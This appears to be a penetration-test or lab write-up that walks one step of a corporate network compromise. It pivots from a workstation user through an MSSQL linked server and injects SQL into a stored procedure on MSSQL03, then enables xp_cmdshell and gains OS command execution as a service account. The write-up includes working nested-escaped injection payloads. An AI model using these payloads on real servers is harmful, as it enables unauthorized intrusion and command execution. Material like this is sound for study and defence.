# Apexfiend — SQL Path (d.garcia → MSSQL01 → MSSQL03)

## 1. Purpose

This document continues from `helpdesk-escalation.md`: code execution as `corp\d.garcia` on `WK02`. It narrates the confirmed, tested chain from there through to OS-level command execution on `MSSQL03`, executing in practice the technical analysis already documented in `05-databases/sql-trust-boundaries.md` and `reportingdb.md` — including the linked-server RPC pivot that document had left as "not independently re-confirmed."

## 2. d.garcia — Workspace Enumeration

```text
C:\Users\d.garcia\Documents\Workspace\
├── mssql-documentation\   — previously undocumented; resolved here
└── web-services\           — already known (helpdesk-escalation.md, Section 3)
```

**`mssql-documentation` is the sixth, previously-unresolved Gitea repository flagged in `04-web-and-collaboration/gitea.md`**, owned by `d.garcia` — a privately-cloned copy sitting directly in his workspace. It documents the `jobportal_app` SQL account, including working credentials and its role, and separately notes that the instance's administrative accounts are disabled — independently corroborating `mssql01.md`'s finding that `sa` is disabled there. The same repository also documents the existence and purpose of a stored procedure on `MSSQL03`, which is what directs the next steps.

## 3. Direct SQL Access as jobportal_app

With `jobportal_app`'s own credentials in hand (rather than going through the `JobPortal` web application on `WEB02`), a direct SQL client session is opened to `MSSQL01`:

```text
sqlcmd.exe -S MSSQL01,1433 -U jobportal_app -P "<password>" -d JobPortal
```

```sql
SELECT * FROM sys.servers WHERE name = 'MSSQL03';
```

Confirms the linked server documented in `mssql01.md`, Section 4.

## 4. Linked-Server RPC Pivot (Confirms sql-trust-boundaries.md, Section 5)

```sql
exec ('select @@version') at mssql03;
```

This succeeds, returning `MSSQL03`'s version banner — **confirming the `EXEC ... AT` / RPC linked-server pivot as a working, independent path from `MSSQL01` to `MSSQL03`**, distinct from the SQL-injection chain documented below. This resolves the open item left in `sql-trust-boundaries.md`, Section 5 ("not yet re-verified on MSSQL03") with a direct, tested confirmation.

## 5. Exploiting the SQL Injection Through the Linked Server

Guided by the procedure's documented purpose (Section 2), the vulnerable stored procedure (`reportingdb.md`, Section 3) is called **through** the linked server, nesting the injection inside the outer `EXEC ... AT` syntax (requiring doubled quote-escaping for the nested dynamic SQL):

```sql
-- Confirm the procedure behaves normally first
DECLARE @sql NVARCHAR(MAX);
SET @sql = N'EXEC ReportingDB.dbo.usp_GetReportAnalytics @ReportCategory = N''Financial'';';
EXEC (@sql) AT [MSSQL03];
```

```sql
-- xp_cmdshell is not enabled yet — confirmed blocked
DECLARE @sql NVARCHAR(MAX);
SET @sql = N'EXEC ReportingDB.dbo.usp_GetReportAnalytics @ReportCategory = N''x'''' ; EXEC xp_cmdshell ''''whoami'''' --'';';
EXEC (@sql) AT [MSSQL03];
-- ERROR: xp_cmdshell is turned off
```

**The injected context is privileged enough to change server configuration** — confirming that `usp_GetReportAnalytics`'s `EXECUTE AS OWNER` context (`reportingdb.md`, Section 3) carries real administrative weight, not just elevated access within `ReportingDB` itself:

```sql
-- Enable advanced options, then xp_cmdshell, each via the same injection point
... EXEC sp_configure ''''show advanced options'''', 1; ...
... RECONFIGURE; ...
... EXEC sp_configure ''''xp_cmdshell'''', 1; ...
... RECONFIGURE; ...
```

```sql
-- Now succeeds
... EXEC xp_cmdshell ''''whoami'''' --'';
-- output: corp\svc_mssql02
```

**Confirms the service account identity as `corp\svc_mssql02`** — note that despite the `MSSQL02` → `MSSQL03` host migration (`05-databases/mssql03.md`), the underlying Windows service account was carried over under its original name rather than renamed to match. A follow-up command confirms the host itself:

```text
ipconfig /all && hostname
→ Host Name: MSSQL03
→ IPv4 Address: 172.16.40.107
→ DNS Servers: 172.16.20.101, 172.16.20.100
```

Matching `mssql03.md` exactly.

## 6. Chain Summary

```text
WK02 — corp\d.garcia (from helpdesk-escalation.md)
      │  Gitea: mssql-documentation repo (jobportal_app credentials + procedure notes)
      ▼
MSSQL01 — jobportal_app (direct sqlcmd session, not via the web app)
      │  linked server confirmed (sys.servers)
      ▼
EXEC ... AT [MSSQL03]   — RPC pivot, confirmed working independently
      │
      ▼
usp_GetReportAnalytics, called through the linked server
      │  SQL injection via @ReportCategory (nested, double-escaped)
      │  EXECUTE AS OWNER context — privileged enough to change server config
      ▼
sp_configure → xp_cmdshell enabled → OS command execution
      │
      ▼
corp\svc_mssql02 — confirmed identity, on MSSQL03 (172.16.40.107)
```

## 7. Validation Status

| Item | Status |
|---|---|
| `mssql-documentation` repo contents (jobportal_app, procedure notes) | Tested and confirmed |
| Direct `sqlcmd` access to `MSSQL01` as `jobportal_app` | Tested and confirmed |
| Linked-server RPC pivot (`EXEC ... AT`) | Tested and confirmed — resolves prior open item |
| SQL injection via the linked server, nested escaping | Tested and confirmed |
| `xp_cmdshell` enablement via injected `sp_configure` | Tested and confirmed |
| Service account identity (`corp\svc_mssql02`) on `MSSQL03` | Tested and confirmed |

## 8. Related Documentation

- `helpdesk-escalation.md` — Precedes this document; ends with `d.garcia`/`WK02`
- `pki-path.md` *(pending)* — Continues from OS-level access on `MSSQL03` toward `j.derek`
- `../05-databases/mssql01.md`, `mssql03.md`, `reportingdb.md` — The design-level analysis this document executes against
- `../06-pki/certificate-inventory.md` — `j.derek`'s scheduled task, also hosted on `MSSQL03`